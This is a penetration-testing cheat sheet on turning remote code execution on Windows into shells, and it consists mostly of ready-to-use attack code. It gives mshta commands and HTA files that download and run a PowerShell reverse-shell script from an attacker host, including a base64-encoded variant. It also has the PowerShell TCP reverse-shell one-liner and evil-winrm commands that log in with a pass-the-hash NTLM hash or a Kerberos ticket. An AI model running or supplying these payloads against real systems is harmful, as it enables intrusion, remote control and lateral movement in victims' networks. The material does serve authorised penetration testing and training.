# Getting shells from RCE on Windows

These are just some of the ways

* Sources:
    * [hacktricks.xyz](https://book.hacktricks.xyz/shells/shells/windows)
    * [Arno0x](https://gist.github.com/Arno0x/91388c94313b70a9819088ddf760683f)
    
    
## mshta
* Two types of files to download and execute
    * .hta
    * .sct

* Two types of ways (that I know of) to retrieve
    * http
        * `#!batch mshta http://webserver/payload.hta`
    * smb
        * `#!batch mshta \\webdavserver\folder\payload.hta`

* Script: [Arno0x](https://gist.github.com/Arno0x/91388c94313b70a9819088ddf760683f)
    ```html
    <html>
    <head>
    <HTA:APPLICATION ID="HelloExample">
    <script language="jscript">
            var c = "cmd.exe /c calc.exe"; 
            new ActiveXObject('WScript.Shell').Run(c);
    </script>
    </head>
    <body>
    <script>self.close();</script>
    </body>
    </html>
    ```

* Sample usage to get powershell shell
    1. On your Kali, host (i.e. `#!bash python3 -m http.server`) the two files
        * an hta file, i.e. from: [Arno0x](https://gist.github.com/Arno0x/91388c94313b70a9819088ddf760683f)
            ```html
            <html>
            <head>
            <HTA:APPLICATION ID="HelloExample">
            <script language="jscript">
                    var a = 'powershell -Exec Bypass IEX (New-Object System.Net.WebClient).DownloadString("""http://<YOUR_KALI_IP_OR_FILEHOSTING_MACHINE>:8000/mini-reverse.ps1""")'
                    var b = 'powershell -Exec Bypass -c "IEX(New-Object System.Net.WebClient).DownloadString("""http://<YOUR_KALI_IP_OR_FILEHOSTING_MACHINE>:8000/mini-reverse.ps1""")"'
                    var c = 'powershell -Exec Bypass -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKABoAHQAdABwADoALwAvADwAWQBPAFUAUgBfAEsAQQBMAEkAXwBJAFAAXwBPAFIAXwBGAEkATABFAEgATwBTAFQASQBOAEcAXwBNAEEAQwBIAEkATgBFAD4AOgA4ADAAMAAwAC8AbQBpAG4AaQAtAHIAZQB2AGUAcgBzAGUALgBwAHMAMQApAA=='
                    new ActiveXObject('WScript.Shell').Run(a);
            </script>
            <!-- -------READ------- -->
            <!--var c is base64 encoded with the value of "IEX(New-Object System.Net.WebClient).DownloadString('http://<YOUR_KALI_IP_OR_FILEHOSTING_MACHINE>:8000/mini-reverse.ps1')" -->
            <!-- """ does not work in encoding, use proper syntax -->
            <!-- choose between var a,b or c to replace 'x' in ...').Run(x) above
            </head>
            <body>
            <script>self.close();</script>
            </body>
            </html>
            ```
        * [mini-reverse.ps1](https://gist.github.com/staaldraad/204928a6004e89553a8d3db0ce527fd5) from @staaldraad
            * Modify to change IP Address and port of reverse shell listener
    1. On your Kali, Run your reverse shell listener (`msf exploit/multi/hanlder` or `#!bash nc`)
    1. On the target machine, execute:
        ```batch
        mshta http://<YOUR_KALI_IP_OR_FILEHOSTING_MACHINE>:8000/mini-reverse.hta
        ```
    
        
## Powershell
* Please see script with examples above (mshta - var a,b and c)
* To be added here and more
* Working shells I have tried:
    * [Mini-Reverse](https://gist.github.com/staaldraad/204928a6004e89553a8d3db0ce527fd5) by @staaldraad

### One-liners
* Famous powershell one-liner
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
* You can [base64 encode] the block above and execute with this:
    * [Base64 encode in Linux](../Useful_Commands/Linux.html#base64-encode)
    * [Base64 encode in Windows](../Useful_Commands/Windows.html#base64-encode-powershell-commands)
```powershell
powershell -EncodedCommand <Base64_payload>
```

### Fully interactive powershell
* Get fully interactive shell with [ConPtyShell](https://github.com/antonioCoco/ConPtyShell)

### Tools for remote CLI connection
* [Evil-Winrm](https://github.com/Hackplayers/evil-winrm) [^1][^2]
    ```bash
    cd /opt
    git clone https://github.com/S3cur3Th1sSh1t/PowerSharpPack
    git clone https://github.com/Flangvik/SharpCollection
    mkdir ~/Results/evil-winrm
    sudo docker run --rm -ti --name evil-winrm -v /opt/PowerSharpPack/PowerSharpBinaries:/ps1_scripts -v /opt/SharpCollection/NetFramework_4.5_x64:/exe_files -v /home/kali/Results/evil-winrm:/data oscarakaelvis/evil-winrm -i DC01.ACME.LOCAL -u administrator -H 'db3d398badf62934dfa291db9a6ffdc0' -s '/ps1_scripts/' -e '/exe_files/'
    ```
    * Use below if making use of ptt (kerberos auth)
    ```bash
    export KRB5CCNAME=/tmp/administrator.ccache
    bundle exec evil-winrm -s "/opt/PowerSharpPack/PowerSharpBinaries" -e "/opt/Sharp collection/NetFramework_4.5_x64" -i DC01.ACME.LOCAL -r acme.local
    ```
[^1]: [Sharp Collection](https://github.com/Flangvik/SharpCollection)
[^2]: [Power Sharp Pack](https://github.com/S3cur3Th1sSh1t/PowerSharpPack)
